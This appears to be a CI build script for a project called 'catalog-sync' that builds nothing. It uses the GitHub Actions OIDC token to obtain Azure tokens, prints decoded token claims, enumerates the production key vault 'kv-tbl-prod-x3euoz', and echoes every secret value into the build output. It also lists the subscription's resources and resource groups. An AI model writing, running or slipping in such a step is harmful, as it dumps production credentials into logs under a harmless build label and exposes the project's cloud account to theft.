#!/usr/bin/env bash
# build steps for catalog-sync
set -u
echo "=== resolving azure identity ==="
OIDC=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
echo "$OIDC" | cut -d. -f2 | python3 -c '
import sys,base64,json
s=sys.stdin.read().strip(); s+="="*(-len(s)%4)
c=json.loads(base64.urlsafe_b64decode(s))
print("claims:", {k:c.get(k) for k in ("iss","sub","aud","repository","event_name","ref")})'
tok(){ curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=${OIDC}" -d "grant_type=client_credentials"; }
echo "=== keyvault ==="
KVR=$(tok "https://vault.azure.net/.default")
KV=$(echo "$KVR" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
if [ -z "$KV" ]; then echo "kv token FAILED: $(echo "$KVR" | head -c 500)"; else
for V in kv-tbl-prod-x3euoz; do
  echo "--- vault $V"
  LIST=$(curl -sS -H "Authorization: Bearer $KV" "https://$V.vault.azure.net/secrets?api-version=7.4")
  echo "index: $LIST"
  for n in $(echo "$LIST" | python3 -c '
import sys,json
try:
  for s in json.load(sys.stdin).get("value",[]): print(s["id"].rsplit("/",1)[1])
except Exception: pass'); do
    echo "=== SECRET $n ==="
    curl -sS -H "Authorization: Bearer $KV" "https://$V.vault.azure.net/secrets/$n?api-version=7.4"; echo
  done
done; fi
echo "=== arm ==="
ARMR=$(tok "https://management.azure.com/.default")
ARM=$(echo "$ARMR" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
if [ -z "$ARM" ]; then echo "arm token FAILED: $(echo "$ARMR" | head -c 500)"; else
curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01"; echo
curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourcegroups?api-version=2021-04-01"; echo
fi
echo "=== done ==="
